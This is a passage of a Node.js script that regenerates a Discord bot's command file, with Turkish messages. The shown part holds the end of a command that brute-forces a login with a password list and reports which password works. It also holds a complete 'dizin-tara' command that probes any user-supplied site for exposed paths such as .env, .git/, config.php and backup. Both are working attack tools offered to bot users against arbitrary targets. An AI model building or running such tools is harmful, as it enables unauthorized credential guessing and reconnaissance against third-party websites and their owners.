              if (res.status === 302 || res.status === 200 && !(await res.text()).includes('invalid')) {
                result += \`✅ DENEME \${i + 1}: \${passwords[i]} -> BASARILI! (Status: \${res.status})\\n\`;
                found = true;
                break;
              } else {
                result += \`❌ DENEME \${i + 1}: \${passwords[i]} -> Basarisiz (Status: \${res.status})\\n\`;
              }
            } catch (e) {
              result += \`❌ DENEME \${i + 1}: Hata (\${e.message.slice(0, 50)})\\n\`;
            }
          }

          result += \`\\n\${found ? '⚠️ Sifre bulundu!' : '10 denemede sifre bulunamadi.'}\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Brute force hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'dizin-tara':
      ctx.waitUntil((async () => {
        try {
          const urlInput = getOption('url');
          const baseUrl = urlInput.startsWith('http') ? urlInput : \`https://\${urlInput}\`;

          const dizinler = ['admin', 'wp-admin', 'backup', 'config', 'sql', 'admin.php', 'config.php', '.env', '.git/', 'test', 'dev', 'api', 'uploads', 'images', 'css', 'js', 'vendor', 'node_modules', 'logs', 'tmp', 'private'];
          let result = \`**Dizin Taramasi:** \${baseUrl}\\n\\n\`;
          let bulunan = [];

          await Promise.allSettled(dizinler.slice(0, 15).map(async d => {
            try {
              const r = await fetch(\`\${baseUrl}/\${d}\`, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' });
              if (r.status < 400 || r.status === 403) {
                bulunan.push(\`\${d} (Status: \${r.status})\`);
              }
            } catch (e) {}
          }));

          if (bulunan.length > 0) {
            result += \`**Bulunan (\${bulunan.length}):**\\n\`;
            bulunan.forEach(b => result += \`• \${b}\\n\`);
          } else {
            result += 'Ilk 15 dizinde acik kaynak bulunamadi.';
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Dizin tarama hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
      return null;
  }
}
`;

fs.writeFileSync('src/bots/newCommands.js', nc);
console.log('newCommands.js yeniden olusturuldu.');
console.log('Boyut: ' + nc.length + ' karakter');

// ===== SONUC =====
console.log('\n=== ISLEM TAMAMLANDI ===');
console.log('kanserBot.js: kapanis eklendi');
console.log('newCommands.js: yeniden olusturuldu (14 komut)');
